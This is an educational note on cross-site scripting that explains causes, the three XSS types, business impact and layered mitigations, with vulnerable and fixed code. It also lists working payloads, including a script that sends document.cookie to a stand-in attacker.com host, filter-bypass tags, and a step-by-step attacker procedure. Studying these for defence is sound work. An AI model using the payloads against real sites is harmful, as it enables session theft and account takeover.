# Cross-Site Scripting (XSS)

## Why this comes right after SQL Injection
Both SQLi and XSS come from the exact same root cause — untrusted input being mixed directly into something that gets interpreted as code, instead of being kept strictly separate as data. SQLi mixes input into a database query; XSS mixes input into the HTML/JavaScript sent back to the browser. This one also directly connects back to the Content-Security-Policy header from `01` — CSP is the browser-level backstop specifically for when XSS happens anyway.

---

## What it is (in plain terms)
XSS happens when user input is placed into a web page's output without being properly neutralized — so instead of showing up as plain text on the page, an attacker's input gets executed as real JavaScript, running in the victim's browser as if it were part of the legitimate site.

## Why it exists — the real-life cause

```javascript
// VULNERABLE — user input inserted directly into the page's HTML
const comment = req.body.comment;
res.send(`<div class="comment">${comment}</div>`);
```
If a user submits `<script>alert(document.cookie)</script>` as their comment, that exact tag gets written into the page and the browser executes it — because the server never checked whether the input contained HTML/script markup before inserting it.

```javascript
// SECURE — input is encoded before being placed into HTML
const comment = req.body.comment;
const safeComment = escapeHtml(comment); // converts < > " ' & into their safe HTML entity equivalents
res.send(`<div class="comment">${safeComment}</div>`);
```
Here, `<script>` becomes the literal text `&lt;script&gt;` on the page — it displays as harmless text instead of executing as code. Modern frameworks (React, Angular, Vue) do this encoding automatically by default, which is a large part of why they're safer out of the box than hand-written HTML strings.

## The three types of XSS

| Type | Where the payload lives | Example scenario |
|---|---|---|
| **Reflected** | In the request itself (URL/parameter), reflected straight back in the response | A search page shows `You searched for: <script>...</script>` because it echoed the URL parameter directly back without encoding |
| **Stored** | Saved in the database, served to *every* user who views that page | A malicious `<script>` submitted as a product review gets stored, then runs in the browser of every customer who later views that product page |
| **DOM-based** | Never touches the server at all — a client-side script insecurely reads part of the URL/page and writes it into the page's HTML | `document.write(location.hash)` on a page where the URL fragment isn't sanitized before being written back into the DOM |

**Stored XSS is the most severe** of the three — one successful injection compromises every subsequent visitor automatically, with no need to trick each victim individually.

## Payload alternatives

| Payload | What it does |
|---|---|
| `<script>alert(document.cookie)</script>` | Proof-of-concept — shows the session cookie can be read by injected script |
| `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>` | Actually exfiltrates the cookie to an attacker-controlled server |
| `<img src=x onerror="alert(1)">` | Bypasses filters that only block the literal string `<script>` — uses an image's error event instead |
| `<svg onload="alert(1)">` | Another script-tag-free alternative, useful when basic tag-blocking filters are in place |

## How an attacker actually does it, step by step
1. Find any place user input is displayed back on a page — search results, comment sections, profile fields, URL parameters shown on the page.
2. Submit a harmless test payload like `<script>alert(1)</script>` and see if a popup appears — confirms the injection works.
3. If a simple filter blocks `<script>`, try alternative tags (`<img onerror=...>`, `<svg onload=...>`) that trigger the same execution without using the blocked keyword.
4. Once confirmed, replace the proof-of-concept payload with one that actually steals data (session cookies, form input, keystrokes) and sends it to an attacker-controlled server.

## Technical Impact
- Session/cookie theft (if `HttpOnly` isn't set on the cookie — see file `02`)
- Keylogging or credential capture directly from the page the victim trusts
- Defacement — altering what the page displays to other users
- Forced actions performed as the victim (e.g. auto-submitting a form using the victim's real, logged-in session)

## Business Impact
Same translation exercise as before — technical impact into money, regulation, and trust:

| Angle | What it actually means |
|---|---|
| **Financial loss** | A stored XSS on a banking dashboard page could silently capture login credentials or session tokens from every customer who visits it — direct path to mass account compromise and fraudulent transactions |
| **Regulatory / compliance** | A confirmed XSS leading to credential or session theft is a reportable security incident under most financial data protection regulations, triggering the same disclosure obligations as a data breach |
| **Reputational damage** | Unlike SQLi (which is often invisible to users), XSS can visibly deface the page or trigger visible pop-ups — a customer-facing incident is harder to keep quiet and spreads faster via customer complaints and social media |
| **Legal liability** | If customer credentials are proven stolen via a known-preventable XSS bug, this strengthens any legal claim that the bank failed basic security due diligence |
| **Operational cost** | Stored XSS specifically may require auditing and cleaning every piece of user-submitted content site-wide, not just fixing one field — often a larger cleanup effort than a single SQLi query fix |

**One-line interview answer:** *"Technically, XSS lets an attacker run their own JavaScript inside our page, in the victim's browser — but the business impact is that it can silently steal session tokens or credentials from every customer who views the affected page, leading to account takeover at scale, which is a reportable incident and a direct fraud and reputational risk."*

## Mitigation — layered, not just one fix

1. **Output encoding (the real fix)** — encode user input based on the context it's placed in (HTML body, HTML attribute, JavaScript, URL) before rendering it. This is the direct equivalent of parameterized queries for SQLi — separate data from code, every time.
2. **Modern frameworks' built-in escaping** — React, Angular, and Vue auto-escape content by default; avoid `dangerouslySetInnerHTML` (React) or `v-html` (Vue) unless the content is proven safe, since those specifically bypass the automatic protection.
3. **Content-Security-Policy** (see file `01`) — even if a script does get injected, a properly configured CSP stops the browser from executing anything not from an explicitly allowed source. This is the critical second layer, not a replacement for output encoding.
4. **HttpOnly cookies** (see file `02`) — limits the damage of a successful XSS by preventing the injected script from reading the session cookie at all.
5. **Input validation as a backup layer** — reject or strip obviously malicious patterns where the expected input type is known, as defense-in-depth alongside proper output encoding.

## Explaining it to a developer
*"Right now, whatever a user types gets written directly into the page's HTML without being encoded — so if someone types a script tag instead of a normal comment, the browser runs it as real code, for every visitor who sees that page. The fix is output encoding: convert special characters like `<` and `>` into their safe text equivalents before inserting user input into HTML, so it always displays as text and never executes as code. Most frameworks do this automatically — the risk is usually in the few places where that automatic protection gets bypassed on purpose."*
